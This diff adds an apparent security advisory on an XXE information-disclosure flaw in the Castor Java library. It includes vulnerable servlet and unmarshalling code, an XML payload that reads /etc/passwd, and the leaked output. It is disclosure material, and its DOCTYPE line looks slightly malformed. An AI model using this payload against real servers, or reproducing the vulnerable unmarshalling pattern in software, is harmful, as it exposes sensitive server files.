@@ -1,0 +1,108 @@
+source: http://www.securityfocus.com/bid/67676/info
+
+Castor Library is prone to an information-disclosure vulnerability.
+
+An attacker can exploit this issue to gain access to sensitive information that may lead to further attacks.
+
+Caster Library 1.3.3-RC1 and earlier are vulnerable. 
+
+===========================================================
+Proof-of-Concept Code and Exploit
+===========================================================
+Now let’s look at how Castor handles unmarshalling calls to show how an
+application could be vulnerable:
+
+In this simple class, we create Person object:
+..snip..
+
+public class Person implements java.io.Serializable {
+
+/** The name of the person */
+   private String name = null;
+
+   /** The Date of birth */
+   private Date dob = null;
+
+   /** Creates a Person with no name */
+   public Person() {
+      super();
+   }
+
+   /** Creates a Person with the given name */
+   public Person(String name) { this.name = name; }
+
+..snip..
+
+Next, we generate a class that takes in external XML data to convert the
+XML document to a Person Object using the unmarshalling function:
+
+public static Person deserializePersonWithStatic(String xmlInput)
+{
+    StringReader xmlReader = new StringReader(xmlInput);
+
+    Person aPerson = null;
+     try
+      {
+          aPerson = (Person) Unmarshaller.unmarshal(Person.class,
+xmlReader);
+      }
+          catch (Exception e)
+      {
+          System.out.println("Failed to unmarshal the xml");
+          e.printStackTrace();
+    }
+
+          return aPerson;
+}
+
+
+If our application took in the XML data from a user controllable location
+and passed it through this unmarshalling function, the end user could use
+this functionality to view local resources on the application’s hosting
+server.  For example, look at the following Servlet that takes in XML data
+from the Request:
+
+public class GeneratePerson extends HttpServlet {
+
+     public void doPost(HttpServletRequest req, HttpServletResponse res)
+                              throws ServletException, IOException
+          {
+               String evilPersonXML = req.getParameter(“person”);
+
+          Person anotherPerson = deserializePersonWithStatic(evilPersonXML);
+
+          if(anotherPerson == null)
+          {
+                  System.out.println("No Person Object set");
+          }
+          else
+          {
+                  System.out.println("XXE Person name: " +
+anotherPerson.getName());
+          }
+
+What would happen if we passed the following string into the “person”
+request parameter value?:
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [
+<!ENTITY x3 SYSTEM "file:///etc/passwd"> ]
+<person><name>&x3;</name></person>
+
+The output would be the following:
+XXE Person name: ##
+# User Database
+#
+# Note that this file is consulted directly only when the system is running
+# in single-user mode.  At other times this information is provided by
+# Open Directory.
+#
+# See the opendirectoryd(8) man page for additional information about
+# Open Directory.
+##
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+daemon:*:1:1:System Services:/var/root:/usr/bin/false
+..snip..
+
+As you can see, the unmarshalling function allowed external entities to be
+referenced and therefore the contents of the server’s /etc/passwd file was
+set within the “name” variable of the deserialized Person object.
